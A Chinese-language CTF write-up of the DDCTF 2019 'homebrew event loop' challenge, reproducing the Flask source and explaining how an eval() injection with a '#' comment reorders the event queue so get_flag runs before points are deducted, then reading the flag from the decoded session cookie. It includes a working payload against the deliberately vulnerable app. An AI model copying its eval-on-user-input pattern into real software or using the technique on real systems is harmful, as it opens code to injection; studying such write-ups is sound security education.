### DDCTF 2019 homebrew event loop

这题出的真好，比赛时盯了几个小时有些思路，可惜没做出来。

<!--more-->

----------

#### 正文

题目给了源码，Python Flask：

``` python
# -*- encoding: utf-8 -*-
# written in python 2.7
__author__ = 'garzon'

from flask import Flask, session, request, Response
import urllib

app = Flask(__name__)
app.secret_key = '*********************' # censored
url_prefix = '/d5afe1f66747e857'

def FLAG():
	return 'FLAG_is_here_but_i_wont_show_you'  # censored
	
def trigger_event(event):
	session['log'].append(event)
	if len(session['log']) > 5: session['log'] = session['log'][-5:]
	if type(event) == type([]):
		request.event_queue += event
	else:
		request.event_queue.append(event)

def get_mid_str(haystack, prefix, postfix=None):
	haystack = haystack[haystack.find(prefix)+len(prefix):]
	if postfix is not None:
		haystack = haystack[:haystack.find(postfix)]
	return haystack
	
class RollBackException: pass

def execute_event_loop():
	valid_event_chars = set('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#')
	resp = None
	while len(request.event_queue) > 0:
		event = request.event_queue[0] # `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......"
		request.event_queue = request.event_queue[1:]
		if not event.startswith(('action:', 'func:')): continue
		for c in event:
			if c not in valid_event_chars: break
		else:
			is_action = event[0] == 'a'
			action = get_mid_str(event, ':', ';')
			args = get_mid_str(event, action+';').split('#')
			try:
				event_handler = eval(action + ('_handler' if is_action else '_function'))
				ret_val = event_handler(args)
			except RollBackException:
				if resp is None: resp = ''
				resp += 'ERROR! All transactions have been cancelled. <br />'
				resp += '<a href="./?action:view;index">Go back to index.html</a><br />'
				session['num_items'] = request.prev_session['num_items']
				session['points'] = request.prev_session['points']
				break
			except Exception, e:
				if resp is None: resp = ''
				#resp += str(e) # only for debugging
				continue
			if ret_val is not None:
				if resp is None: resp = ret_val
				else: resp += ret_val
	if resp is None or resp == '': resp = ('404 NOT FOUND', 404)
	session.modified = True
	return resp
	
@app.route(url_prefix+'/')
def entry_point():
	querystring = urllib.unquote(request.query_string)
	request.event_queue = []
	if querystring == '' or (not querystring.startswith('action:')) or len(querystring) > 100:
		querystring = 'action:index;False#False'
	if 'num_items' not in session:
		session['num_items'] = 0
		session['points'] = 3
		session['log'] = []
	request.prev_session = dict(session)
	trigger_event(querystring)
	return execute_event_loop()

# handlers/functions below --------------------------------------

def view_handler(args):
	page = args[0]
	html = ''
	html += '[INFO] you have {} diamonds, {} points now.<br />'.format(session['num_items'], session['points'])
	if page == 'index':
		html += '<a href="./?action:index;True%23False">View source code</a><br />'
		html += '<a href="./?action:view;shop">Go to e-shop</a><br />'
		html += '<a href="./?action:view;reset">Reset</a><br />'
	elif page == 'shop':
		html += '<a href="./?action:buy;1">Buy a diamond (1 point)</a><br />'
	elif page == 'reset':
		del session['num_items']
		html += 'Session reset.<br />'
	html += '<a href="./?action:view;index">Go back to index.html</a><br />'
	return html

def index_handler(args):
	bool_show_source = str(args[0])
	bool_download_source = str(args[1])
	if bool_show_source == 'True':
	
		source = open('eventLoop.py', 'r')
		html = ''
		if bool_download_source != 'True':
			html += '<a href="./?action:index;True%23True">Download this .py file</a><br />'
			html += '<a href="./?action:view;index">Go back to index.html</a><br />'
			
		for line in source:
			if bool_download_source != 'True':
				html += line.replace('&','&amp;').replace('\t', '&nbsp;'*4).replace(' ','&nbsp;').replace('<', '&lt;').replace('>','&gt;').replace('\n', '<br />')
			else:
				html += line
		source.close()
		
		if bool_download_source == 'True':
			headers = {}
			headers['Content-Type'] = 'text/plain'
			headers['Content-Disposition'] = 'attachment; filename=serve.py'
			return Response(html, headers=headers)
		else:
			return html
	else:
		trigger_event('action:view;index')
		
def buy_handler(args):
	num_items = int(args[0])
	if num_items <= 0: return 'invalid number({}) of diamonds to buy<br />'.format(args[0])
	session['num_items'] += num_items 
	trigger_event(['func:consume_point;{}'.format(num_items), 'action:view;index'])
	
def consume_point_function(args):
	point_to_consume = int(args[0])
	if session['points'] < point_to_consume: raise RollBackException()
	session['points'] -= point_to_consume
	
def show_flag_function(args):
	flag = args[0]
	#return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.
	return 'You naughty boy! ;) <br />'
	
def get_flag_handler(args):
	if session['num_items'] >= 5:
		trigger_event('func:show_flag;' + FLAG()) # show_flag_function has been disabled, no worries
	trigger_event('action:view;index')
	
if __name__ == '__main__':
	app.run(debug=False, host='0.0.0.0')
```

有这么两个跟 flag 有关的函数：

``` python
def show_flag_function(args):
	flag = args[0]
	#return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.
	return 'You naughty boy! ;) <br />'
	
def get_flag_handler(args):
	if session['num_items'] >= 5:
		trigger_event('func:show_flag;' + FLAG())
	trigger_event('action:view;index')
```

可以看到`show_flag_function()`无法直接展示出 flag，先看看`get_flag_handler()`中用到的`trigger_event()`函数：

``` python
def trigger_event(event):
	session['log'].append(event)
	if len(session['log']) > 5: session['log'] = session['log'][-5:]
	if type(event) == type([]):
		request.event_queue += event
	else:
		request.event_queue.append(event)
```

这个函数往 session 里写了日志，而这个日志里就有 flag，并且 flask 的 session 是可以被解密的。只要后台成功设置了这个 session 我们就有机会获得 flag。

但若想正确调用`show_flag_function()`，必须满足`session['num_items'] >= 5`。

购买`num_items`需要花费`points`，而我们只有 3 个`points`，如何获得 5 个`num_items`？

先看看购买的机制：

``` python
def buy_handler(args):
	num_items = int(args[0])
	if num_items <= 0: return 'invalid number({}) of diamonds to buy<br />'.format(args[0])
	session['num_items'] += num_items 
	trigger_event(['func:consume_point;{}'.format(num_items), 'action:view;index'])
	
def consume_point_function(args):
	point_to_consume = int(args[0])
	if session['points'] < point_to_consume: raise RollBackException()
	session['points'] -= point_to_consume
```

`buy_handler()`这个函数会先把`num_items`的数目给你加上去，然后再执行`consume_point_function()`，若`points`不够`consume_point_function()`会把`num_items`的数目再扣回去。

说白了就是商家先交了货，发现顾客没给钱，再把货抢回来。

那么我们只要赶在货被抢回来之前，先执行`get_flag_handler()`即可。

函数`trigger_event()`维护了一个命令执行的队列，只要让`get_flag_handler()`赶在`consume_point_function()`之前进入队列即可。

看看最关键的执行函数：

``` python
def execute_event_loop():
	valid_event_chars = set('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#')
	resp = None
	while len(request.event_queue) > 0:
		event = request.event_queue[0] # `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......"
		request.event_queue = request.event_queue[1:]
		if not event.startswith(('action:', 'func:')): continue
		for c in event:
			if c not in valid_event_chars: break
		else:
			is_action = event[0] == 'a'
			action = get_mid_str(event, ':', ';')
			args = get_mid_str(event, action+';').split('#')
			try:
				event_handler = eval(action + ('_handler' if is_action else '_function'))
				ret_val = event_handler(args)
			except RollBackException:
				if resp is None: resp = ''
				resp += 'ERROR! All transactions have been cancelled. <br />'
				resp += '<a href="./?action:view;index">Go back to index.html</a><br />'
				session['num_items'] = request.prev_session['num_items']
				session['points'] = request.prev_session['points']
				break
			except Exception, e:
				if resp is None: resp = ''
				#resp += str(e) # only for debugging
				continue
			if ret_val is not None:
				if resp is None: resp = ret_val
				else: resp += ret_val
	if resp is None or resp == '': resp = ('404 NOT FOUND', 404)
	session.modified = True
	return resp
```

这里利用`eval()`可以导致任意命令执行，使用注释符可以 bypass 掉后面的拼接部分。

若让`eval()`去执行`trigger_event()`，并且在后面跟两个命令作为参数，分别是`buy`和`get_flag`，那么`buy`和`get_flag`便先后进入队列。

根据顺序会先执行`buy_handler()`，此时`consume_point`进入队列，排在`get_flag`之后，我们的目标达成。

所以最终 Payload 如下：

``` txt
action:trigger_event%23;action:buy;5%23action:get_flag;
```

进入队列的顺序：

``` txt
action:trigger_event#;action:buy;5#action:get_flag;
action:buy;5
action:get_flag;
func:consume_point;5
action:view;index
func:show_flag;`FLAG()`
action:view;index
```

日志写入的顺序：

``` txt
action:trigger_event#;action:buy;5#action:get_flag;
['action:buy;5','action:get_flag;']
['func:consume_point;5','action:view;index']
func:show_flag;`FLAG()`
action:view;index
```

日志没有溢出，满足要求。

发送 Payload，得到 Cookie,再用 [Flask Unsign](https://github.com/Paradoxis/Flask-Unsign-Wordlist) 解密 session 即可。

----------

#### 反思

当时做的时候我的思路是这样的：

``` txt
想办法获得密钥
cookie欺骗改items数
有了密钥能通过哈希检测
通过日志带出flag
```

``` txt
怎么获得密钥？
模板注入？
没看出来啊。。。
eval带出密钥？
过滤太多字符做不到啊。。。
爆破？
脚本跑了几十万弱口令都没跑出来啊。。。
社工？
找到了作者的gayhub但没发现啊。。。
```

``` txt
怎么获得密钥啊。。。
怎么获得密钥啊。。。
怎么获得密钥啊。。。
...
```

当时应该快点意识到用注释符去 bypass 掉`eval()`里的拼接，然后在这个队列上多想想。

过滤了这么多字符，出题人的意思就是让我们用现有的函数去拿 flag，而不是用别的方法去搞密钥。

而且我这个想法根本就没用到 buy 这个机制，应该早点注意到这个 buy 有点不对劲。